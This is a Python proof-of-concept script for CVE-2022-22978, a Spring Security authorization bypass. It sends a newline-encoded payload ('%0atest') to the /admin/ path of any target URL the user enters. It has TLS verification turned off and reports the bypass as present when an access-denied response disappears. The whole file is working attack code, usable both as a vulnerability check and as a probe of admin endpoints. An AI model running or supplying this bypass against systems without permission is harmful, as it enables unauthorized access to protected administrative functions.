import requests
from time import sleep
requests.packages.urllib3.disable_warnings()

'''
CVE-2022-22978: Spring Security Authorization Bypass in RegexRequestMatcher

In Spring Security versions 5.5.6 and 5.6.3 and older unsupported versions, RegexRequestMatcher can easily be misconfigured to be bypassed on some servlet containers.

Applications using RegexRequestMatcher with . in the regular expression are possibly vulnerable to an authorization bypass.

References:

https://tanzu.vmware.com/security/cve-2022-22978
https://github.com/DeEpinGh0st/CVE-2022-22978
'''


def poc(url, useragent, proxies=None):
    header = {
        'User-Agent': useragent
    }

    payload1 = '%0atest'
    payload2 = '%0dtest'

    try:
        r1 = requests.get(url=url + "/admin/", headers=header, timeout=10 ,verify=False, proxies=proxies)
        sleep(0.5)
        r2 = requests.get(url=url + f"/admin/{payload1}", headers=header, timeout=10 ,verify=False, proxies=proxies)
        if 'denied' in str(r1.text) and 'denied' not in str(r2.text):
            return f'[+] CVE-2022-22978 exists.'
        else:
            return "[-] CVE-2022-22978 not exists."
    except Exception as e:
        return f'[-] An error occurred and it has been logged: {e}'

if __name__ == '__main__':
    print(poc(input('请输入目标url:').strip('/'), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'))